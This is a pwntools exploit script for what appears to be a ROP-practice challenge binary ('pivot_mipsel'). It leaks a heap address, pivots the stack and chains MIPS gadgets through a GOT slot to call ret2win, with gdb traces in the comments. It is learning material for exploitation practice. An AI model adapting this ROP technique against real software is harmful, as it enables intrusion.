from pwn import *
import re

io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu pivot_mipsel",shell=True)
#io = process("qemu-mipsel -L /usr/mipsel-linux-gnu pivot_mipsel",shell=True)
elf = context.binary = ELF("./pivot_mipsel")

io.recvuntil(b"to pivot: ")
regex = "0x[a-z0-9A-Z]+"
heap_address = re.findall(regex, io.recvline().strip().decode())[0]
heap_address = int(heap_address,16)
io.success(f"heap address: {hex(heap_address)}")

pivot_gadget = 0x00400cd0               # move $sp, $fp; lw $ra, 8($sp); lw $fp, 4($sp); jr $ra; addiu $sp, $sp, 0xc;
caller_gadget = 0x00400ca0              # lw $t9, 8($sp); lw $t0, 4($sp); jalr $t9; addiu $sp, $sp, 0xc;
load_t1_addr_gadget = 0x00400cb0        # lw $t9, 8($sp); lw $t2, 4($sp); lw $t1, ($t2); jalr $t9; addiu $sp, $sp, 0xc;
add_and_jump_gadget = 0x00400cc4        # add $t9, $t0, $t1; jalr $t9; addiu $sp, $sp, 4;
foothold_function_PLT = 0x400e60
foothold_function_GOT_SLOT = 0x412060 

# Stage 2 (256 bytes)
# problemon: foothold pone ra=sp+0x8 de nuevo pero no actualiza sp
ropchain = b""
ropchain += p32(0) * 2                            # sp+0,+4
ropchain += p32(caller_gadget)                    # sp+8  -- $ra
# sp + 0xc
ropchain += p32(0) * 2                            # sp+0,+4
ropchain += p32(foothold_function_PLT)            # sp+8  -- $t9      (force lazy binding)
# sp + 0xc
"""
foothold_function returns to this part and sets up $t1 for us
  0x400cb0 <usefulGadgets+16>: lw      t9,8(sp)
   0x400cb4 <usefulGadgets+20>: lw      t2,4(sp)
   0x400cb8 <usefulGadgets+24>: lw      t1,0(t2)
=> 0x400cbc <usefulGadgets+28>: jalr    t9
   0x400cc0 <usefulGadgets+32>: addiu   sp,sp,12
(gdb) x/wx  0x2c53cf20
0x2c53cf20:     0x00000000
(gdb)
0x2c53cf24:     0x00412060
(gdb)
0x2c53cf28:     0x00400ca0
"""
ropchain += p32(0)                                # sp+0
ropchain += p32(foothold_function_GOT_SLOT)       # sp+4  -- $t1      (GOT address)
ropchain += p32(caller_gadget)                    # sp+8  -- $t9       
# sp + 0xc
ropchain += p32(0)                                
ropchain += p32(0x378)                            # sp+4  -- $t0      (offset)
ropchain += p32(add_and_jump_gadget)              # sp+8  -- $t9      (call ret2win)

# Stage 1
stager = b"A"*32
stager += p32(heap_address)    # $fp
stager += p32(pivot_gadget)    # $ra

io.sendline(ropchain)
io.sendline(stager)
io.interactive()
